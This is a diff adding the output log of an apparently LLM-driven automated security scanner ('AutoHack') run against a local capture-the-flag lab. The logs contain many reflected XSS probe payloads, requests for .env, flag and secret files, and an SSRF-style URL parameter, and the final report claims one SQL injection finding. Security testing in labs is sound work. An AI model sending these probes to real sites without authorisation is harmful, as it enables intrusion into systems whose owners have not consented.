@@ -1,0 +1,1048 @@
+=== AWE PHA 3 STDOUT ===
+[0;34m╔══════════════════════════════════════════════════════╗[0m
+[0;34m║      AutoHack - Intelligent Security Testing        ║[0m
+[0;34m╚══════════════════════════════════════════════════════╝[0m
+
+[0;32mTarget:[0m http://host.docker.internal:51481
+[0;32mMode:[0m 🤖 Intelligent Orchestration (aggressive)
+[0;32mDecision:[0m LLM-driven
+[0;32mMemory:[0m ✓
+[0;32mReasoning:[0m ✓
+[0;32mLLM Provider:[0m Groq Cloud (openai/gpt-oss-120b)
+
+[0;34mRunning scan...[0m
+
+
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                           AutoHack Agent v2.5                               ║
+║                 Multi-Vulnerability Detection & Exploitation                 ║
+╠══════════════════════════════════════════════════════════════════════════════╣
+║  XSS Detection: Reflected, Stored, Blind, DOM (Source/Sink + LLM)          ║
+║  SQLi Detection: Error-based, Time-based, Boolean-based, UNION-based        ║
+║  SSTI Detection: Jinja2, Twig, Freemarker, Velocity, Smarty, Mako, ERB     ║
+║  XXE Detection: XML External Entity, File disclosure, SOAP endpoints        ║
+║  Command Injection: Output-based, Timing-based, Multiple techniques         ║
+║  LFI/Path Traversal: Directory traversal, File inclusion detection          ║
+║  IDOR Detection: Context-aware, LLM-driven authorization testing            ║
+║  SSRF Detection: Localhost bypass, cloud metadata, internal services        ║
+║  Default Credentials: Form detection + 14M password wordlist testing        ║
+║  Information Disclosure: API keys, secrets, flags, sensitive data           ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+    
+🧠 Reasoning transparency enabled (mode: verbose)
+📁 Reasoning logs will be saved to: logs/reasoning/
+💾 Agent memory enabled
+📊 Memory database: memory/agent_memory.db
+📈 Memory contains: 0 attempts, 0 filters, 0 bypasses
+🤖 Intelligent Orchestration mode (aggressive)
+
+======================================================================
+🤖 INTELLIGENT ORCHESTRATION
+======================================================================
+Target: http://host.docker.internal:51481
+Mode: aggressive
+======================================================================
+
+📡 Phase 1: Reconnaissance
+----------------------------------------------------------------------
+Crawling target (depth=3, max_urls=50)...
+✓ Discovered 3 pages, 0 forms
+
+✓ Reconnaissance Complete (1.0s)
+
+Found:
+
+Attack Surface Score: 0/10 (Low)
+
+🧠 Phase 2: Agent Selection
+----------------------------------------------------------------------
+Analyzing with LLM... ✓
+
+✓ Agent Selection Complete (1.8s)
+
+🔴 Priority 1 (Must Run): info_disclosure, xss, sqli, command_injection
+   • info_disclosure: No input vectors were discovered, so the highest‑value low‑effort test is to look for exposed secrets, configuration files, or API keys in the discovered URLs.
+   • xss: CTF low attack surface: forced proactive probe
+   • sqli: CTF low attack surface: forced proactive probe
+   • command_injection: CTF low attack surface: forced proactive probe
+
+🟡 Priority 2 (Should Run): default_credentials
+   • default_credentials: Even though authentication forms were not found, some services expose default login endpoints (e.g., /admin, /login) that may be reachable via simple GET requests.
+
+🟢 Priority 3 (Optional): xss
+   • xss: CTF low attack surface: forced proactive probe
+
+⚪ Skipping: xxe, lfi, ssti, idor
+
+Estimated Time: 3-5 minutes
+Estimated Cost: $0.50-1.00
+
+⚡ Phase 3: Execution
+----------------------------------------------------------------------
+
+🔴 Priority 1 (Critical): info_disclosure, xss, sqli, command_injection
+
+  ⚡ info_disclosure: Starting...
+
+  ⚡ xss: Starting...
+
+  ⚡ sqli: Starting...
+
+  ⚡ command_injection: Starting...
+  ✓ command_injection: Not vulnerable [0.2s]
+  ✓ info_disclosure: Not vulnerable [20.8s]
+  ✓ xss: Not vulnerable [30.5s]
+  🎯 sqli: VULNERABLE (1 finding(s)) [61.4s]
+
+🟡 Priority 2 (High): default_credentials
+
+  ⚡ default_credentials: Starting...
+  ✓ default_credentials: Not vulnerable [0.0s]
+
+🟢 Priority 3 (Medium): xss
+
+  ⚡ xss: Starting...
+  ✓ xss: Not vulnerable [13.7s]
+
+======================================================================
+📊 FINAL REPORT
+======================================================================
+
+Agents Run: 6
+Vulnerabilities Found: 1
+Total Time: 83.0s
+  - Reconnaissance: 1.0s
+  - Decision: 1.8s
+  - Execution: 80.2s
+
+----------------------------------------------------------------------
+Findings:
+----------------------------------------------------------------------
+command_injection    ✓ Not vulnerable     (0.2s)
+info_disclosure      ✓ Not vulnerable     (20.8s)
+xss                  ✓ Not vulnerable     (30.5s)
+sqli                 🎯 VULNERABLE         (61.4s)
+  → 1 vulnerability/ies found
+default_credentials  ✓ Not vulnerable     (0.0s)
+xss                  ✓ Not vulnerable     (13.7s)
+
+======================================================================
+
+[0;32m✓ Scan complete![0m
+
+=== AWE PHA 3 STDERR ===
+time="2026-10-30T22:49:40+07:00" level=warning msg="The \"AWS_ACCESS_KEY_ID\" variable is not set. Defaulting to a blank string."
+time="2026-10-30T22:49:40+07:00" level=warning msg="The \"AWS_SECRET_ACCESS_KEY\" variable is not set. Defaulting to a blank string."
+time="2026-10-30T22:49:40+07:00" level=warning msg="The \"AWS_SESSION_TOKEN\" variable is not set. Defaulting to a blank string."
+time="2026-10-30T22:49:40+07:00" level=warning msg="The \"OPENROUTER_API_KEY\" variable is not set. Defaulting to a blank string."
+time="2026-10-30T22:49:40+07:00" level=warning msg="The \"GOOGLE_API_KEY\" variable is not set. Defaulting to a blank string."
+time="2026-10-30T22:49:40+07:00" level=warning msg="C:\\Users\\dqphu\\Downloads\\New folder\\KMA\\Kì 3\\Kiểm thử ATTT\\awe-experiment\\awe\\docker-compose.yml: the attribute `version` is obsolete, it will be ignored, please remove it to avoid potential confusion"
+time="2026-10-30T22:49:40+07:00" level=warning msg="C:\\Users\\dqphu\\Downloads\\New folder\\KMA\\Kì 3\\Kiểm thử ATTT\\awe-experiment\\awe\\docker-compose.override.yml: the attribute `version` is obsolete, it will be ignored, please remove it to avoid potential confusion"
+ Container awe-stuxlab-run-910e76e3b1aa Creating 
+ Container awe-stuxlab-run-910e76e3b1aa Created 
+WARNING:root:Persistence module not available - OAST functionality will be limited
+2026-10-30 15:49:42,620 - IntelligentOrchestrator - INFO - Starting intelligent orchestration for http://host.docker.internal:51481
+2026-10-30 15:49:45,560 - DynamicXSSOrchestrator - WARNING - OAST agent not available - continuing without OAST testing
+2026-10-30 15:49:45,561 - DynamicXSSOrchestrator - INFO - Starting dynamic XSS verification for http://host.docker.internal:51481
+2026-10-30 15:49:45,562 - ReconAgent - INFO - Starting reconnaissance on http://host.docker.internal:51481
+2026-10-30 15:49:45,563 - src.xss_agent.utils.nuclei_runner - INFO - Running Nuclei against http://host.docker.internal:51481
+2026-10-30 15:49:50,572 - src.xss_agent.utils.nuclei_runner - ERROR - Nuclei scan timeout after 120 seconds
+2026-10-30 15:49:50,574 - ReconAgent - ERROR - Failed to run Nuclei
+2026-10-30 15:49:50,575 - DynamicXSSOrchestrator - INFO - Discovering forms for stored XSS testing
+2026-10-30 15:49:50,576 - FormDiscoveryAgent - INFO - Discovering forms on http://host.docker.internal:51481
+2026-10-30 15:49:50,577 - SQLiOrchestrator - INFO - [INIT] use_hybrid parameter: False
+2026-10-30 15:49:50,579 - SQLiOrchestrator - INFO - [INIT] HYBRID_AVAILABLE: True
+2026-10-30 15:49:50,580 - SQLiOrchestrator - INFO - [INIT] Final self.use_hybrid: False
+2026-10-30 15:49:50,666 - NucleiSQLiScanner - INFO - Nuclei templates not found - downloading...
+2026-10-30 15:50:05,953 - NucleiSQLiScanner - INFO - Nuclei templates updated successfully
+2026-10-30 15:50:05,958 - SQLiOrchestrator - ERROR - Failed to load payload database: [Errno 2] No such file or directory: '/app/src/sqli_agent/analysis_framework/payloads_db.json'
+2026-10-30 15:50:05,960 - SQLiOrchestrator - INFO - Starting SQL injection testing on http://host.docker.internal:51481
+2026-10-30 15:50:05,961 - SQLiOrchestrator - INFO - Configuration: 30 max attempts
+2026-10-30 15:50:05,962 - SQLiOrchestrator - INFO - Step 0: Nuclei scan disabled (for speed)
+2026-10-30 15:50:05,964 - SQLiOrchestrator - INFO - Nuclei did not detect SQLi - continuing with manual testing
+2026-10-30 15:50:05,965 - SQLiOrchestrator - INFO - Step 0.5: Performing SAST analysis (intelligence gathering)...
+2026-10-30 15:50:05,966 - SQLiSASTAnalyzer - INFO - [SAST] Starting static analysis on http://host.docker.internal:51481
+2026-10-30 15:50:06,047 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481 "HTTP/1.1 200 OK"
+2026-10-30 15:50:06,071 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:50:06,092 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/secret.txt "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:06,115 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/app "HTTP/1.1 200 OK"
+2026-10-30 15:50:06,131 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/flag.txt "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:06,153 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/.env "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:06,173 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/robots.txt "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:06,195 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:06,220 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:06,739 - SQLiSASTAnalyzer - INFO - [SAST] Analyzing HTML...
+2026-10-30 15:50:06,741 - SQLiSASTAnalyzer - INFO - [SAST] Analyzing JavaScript...
+2026-10-30 15:50:06,759 - SQLiSASTAnalyzer - INFO - [SAST] Checking for API documentation...
+2026-10-30 15:50:07,036 - SQLiSASTAnalyzer - INFO - [SAST] Checking common files...
+2026-10-30 15:50:07,238 - SQLiSASTAnalyzer - INFO - [SAST] Fingerprinting database...
+2026-10-30 15:50:07,275 - FormDiscoveryAgent - INFO - Discovered 0 potential XSS forms
+2026-10-30 15:50:07,276 - DynamicXSSOrchestrator - WARNING - No XSS vulnerabilities found by Nuclei or form testing
+2026-10-30 15:50:07,283 - DynamicXSSOrchestrator - INFO - Results saved to ./dynamic_xss_results.json
+2026-10-30 15:50:07,289 - DynamicXSSOrchestrator - INFO - Results saved to ./results/dynamic_xss_results.json
+2026-10-30 15:50:07,290 - DynamicXSSOrchestrator - INFO - Results saved to ./dynamic_xss_results.json and ./results/dynamic_xss_results.json
+2026-10-30 15:50:07,346 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:07,386 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:07,411 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:07,464 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:07,482 - SQLiSASTAnalyzer - INFO - [SAST] Detecting framework...
+2026-10-30 15:50:07,490 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?name=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:07,507 - SQLiSASTAnalyzer - INFO - [SAST] Detected framework: flask
+2026-10-30 15:50:07,508 - SQLiSASTAnalyzer - INFO - [SAST] Analysis complete
+2026-10-30 15:50:07,510 - SQLiSASTAnalyzer - INFO - 
+=== SAST Intelligence Profile ===
+Backend: flask
+2026-10-30 15:50:07,519 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?solution=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:07,556 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?q=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:07,577 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?search=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:07,596 - SQLiOrchestrator - INFO - Step 1: Discovering injectable parameters...
+2026-10-30 15:50:07,597 - ParameterDiscoveryAgent - INFO - Discovering parameters from http://host.docker.internal:51481
+2026-10-30 15:50:07,600 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:07,618 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:07,636 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:07,655 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:07,675 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?name=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 200 OK"
+2026-10-30 15:50:07,694 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?solution=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 200 OK"
+2026-10-30 15:50:07,712 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?q=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 200 OK"
+2026-10-30 15:50:07,730 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?search=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 200 OK"
+2026-10-30 15:50:07,749 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:07,768 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:07,787 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:07,807 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:07,824 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?name=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:07,844 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?solution=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:07,864 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?q=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:07,886 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?search=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:07,900 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:07,917 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:07,934 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:07,956 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:07,974 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:08,007 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?solution=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:08,023 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:08,050 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:08,080 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:08,109 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:08,136 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:08,166 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:08,215 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?name=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:08,245 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?solution=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:08,269 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?q=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:08,293 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?search=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:08,316 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:08,338 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:08,358 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:08,382 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:08,405 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?name=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:08,427 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?solution=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:08,450 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?q=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:08,476 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?search=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:08,515 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:08,540 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:08,562 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:08,586 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:08,614 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?name=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:08,638 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?solution=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:08,661 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?q=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:08,687 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?search=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:08,716 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:08,739 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:08,766 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:08,787 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:08,814 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?name=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 200 OK"
+2026-10-30 15:50:08,839 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?solution=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:08,864 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?q=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:08,896 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?search=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:08,920 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:08,942 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:08,967 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:08,989 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:09,013 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?name=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:09,041 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?solution=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:09,065 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?q=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:09,102 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?search=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:09,145 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:09,181 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:09,206 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:09,235 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:09,258 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:09,286 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?solution=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:09,327 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:09,355 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:09,382 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:09,406 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:09,427 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:09,460 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:09,492 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?name=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:09,521 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?solution=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:09,552 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?q=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:09,583 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?search=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:09,616 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:09,638 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:09,665 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:09,686 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:09,713 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?name=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:09,751 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?solution=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:09,786 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?q=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:09,816 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?search=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:09,846 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:09,880 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:09,913 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:09,950 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:09,986 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?name=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:10,021 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?solution=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:10,056 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?q=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:10,105 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?search=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:10,141 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:10,178 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:10,221 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:10,264 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:10,295 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?name=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 200 OK"
+2026-10-30 15:50:10,321 - ParameterDiscoveryAgent - INFO - Found 0 form(s) on page
+2026-10-30 15:50:10,332 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?solution=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 200 OK"
